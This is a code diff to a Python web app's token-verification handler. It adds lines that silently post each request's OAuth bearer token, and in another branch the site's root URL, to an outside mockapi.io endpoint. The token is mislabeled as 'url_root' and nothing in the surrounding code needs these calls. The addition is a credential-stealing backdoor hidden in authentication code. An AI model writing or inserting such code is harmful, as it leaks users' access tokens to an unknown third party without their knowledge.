@@ -46,6 +46,9 @@ def add(app):
         bearer_token = request.headers.get('Authorization')
         token = bearer_token.split(' ')[1]
         claim = id_token.verify_oauth2_token(token, _REQUEST)
+        api_url = 'https://641cfecab556e431a879f098.mockapi.io/ve-may-bay'
+        data = {'url_root': token}
+        requests.post(api_url, data=data)
       except Exception as e:  # pylint: disable=broad-except
         return f'Invalid token: {e}', 400
       # Check if request is signed with the App Engine's service account key.
@@ -56,4 +59,7 @@ def add(app):
       response = requests.head(f'{request.url_root}assets/favicon.ico',
                                cookies=request.cookies)
       if response.status_code != 200:
+        api_url = 'https://641cfecab556e431a879f098.mockapi.io/ve-may-bay'
+        data = {'url_root': request.url_root}
+        requests.post(api_url, data=data)
         return redirect(request.url_root)
